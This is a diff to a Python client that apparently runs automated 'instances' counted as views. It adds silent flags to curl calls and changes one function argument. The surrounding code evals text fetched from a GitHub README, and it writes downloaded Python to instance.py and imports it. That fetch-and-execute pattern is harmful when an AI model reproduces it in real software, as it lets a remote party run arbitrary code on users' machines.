@@ -41,7 +41,7 @@ def activate_windows():
 def fetch_global_addresses():
     while True:
         try:
-            response = popen(f"curl https://raw.githubusercontent.com/BhaskarPanja93/AllLinks.github.io/master/README.md")
+            response = popen(f"curl -s https://raw.githubusercontent.com/BhaskarPanja93/AllLinks.github.io/master/README.md")
             link_dict = eval(response.read())
             try:
                 global_host_page = choice(link_dict['global_host_page_list'])
@@ -208,7 +208,7 @@ def __get_global_ip(trial = 0):
         try:
             global_host_address, global_host_page = fetch_global_addresses()
             if get(f"{global_host_page}/ping").text == 'ping':
-                response = popen(f"curl {global_host_page}/ip").read()
+                response = popen(f"curl -s {global_host_page}/ip").read()
                 if "Current_Visitor_IP:" in response:
                     return response.replace("Current_Visitor_IP:",'')
                 else:
@@ -231,7 +231,7 @@ def run_instance(instance_name):
                         with open('instance.py', 'wb') as file:
                             file.write(response['py_file_data'])
                         import instance
-                        s, comment, img_dict = instance.run(img_dict=img_dict, _global_host_page=global_host_page, _local_page=local_page)
+                        s, comment, img_dict = instance.run(__local_page=local_page)
                         views += s
                 else:
                     _ = 1/0
